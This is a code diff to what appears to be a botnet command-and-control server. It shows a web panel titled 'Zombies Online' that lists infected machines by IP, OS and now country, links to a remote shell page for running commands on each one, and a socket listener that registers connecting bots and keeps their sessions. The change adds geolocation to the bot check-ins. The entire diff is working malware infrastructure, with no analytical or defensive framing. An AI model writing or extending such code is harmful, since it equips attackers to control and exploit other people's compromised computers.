@@ -37,7 +37,7 @@ HTML_TEMPLATE = """
     <h1>Zombies Online: {{ online_count }}</h1>
     <table>
         <tr>
-            <th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Shell</th>
+            <th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Country</th><th>Shell</th>
         </tr>
         {% for bot_id, info in bots.items() %}
         <tr>
@@ -45,6 +45,7 @@ HTML_TEMPLATE = """
             <td class="{{ 'online' if info['status'] == 'Online' else 'offline' }}">{{ info['status'] }}</td>
             <td>{{ info['ip'] }}</td>
             <td>{{ info['os'] }}</td>
+            <td>{{ info['country'] }}</td>
             <td><a href="/shell-id={{ bot_id }}">🖹</a></td>
         </tr>
         {% endfor %}
@@ -60,7 +61,7 @@ SHELL_TEMPLATE = """
     <input type='submit' value='Execute'>
 </form>
 <textarea readonly>{{ output }}</textarea><br>
-<a href='/'>⬅ Back</a>
+<a href='/'>← Back</a>
 """
 
 def save_bots():
@@ -73,13 +74,14 @@ def load_bots():
         with open(PICKLE_FILE, 'rb') as f:
             bots = pickle.load(f)
 
-def update_bot(ip, os_name):
+def update_bot(ip, os_name, country):
     for bot_id, info in bots.items():
         if info['ip'] == ip:
             bots[bot_id].update({
                 'status': 'Online',
                 'last_seen': time.time(),
-                'os': os_name
+                'os': os_name,
+                'country': country
             })
             save_bots()
             return bot_id
@@ -88,7 +90,8 @@ def update_bot(ip, os_name):
         'ip': ip,
         'status': 'Online',
         'last_seen': time.time(),
-        'os': os_name
+        'os': os_name,
+        'country': country
     }
     save_bots()
     return bot_id
@@ -102,8 +105,9 @@ def socket_listener():
         conn, addr = s.accept()
         ip = addr[0]
         try:
-            os_name = conn.recv(1024).decode()
-            bot_id = update_bot(ip, os_name)
+            client_info = conn.recv(1024).decode()
+            os_name, country = client_info.split("\nCountry: ")
+            bot_id = update_bot(ip, os_name, country)
             sessions[bot_id] = conn
             print(f"[+] Bot {bot_id} ({ip}) connected")
         except:
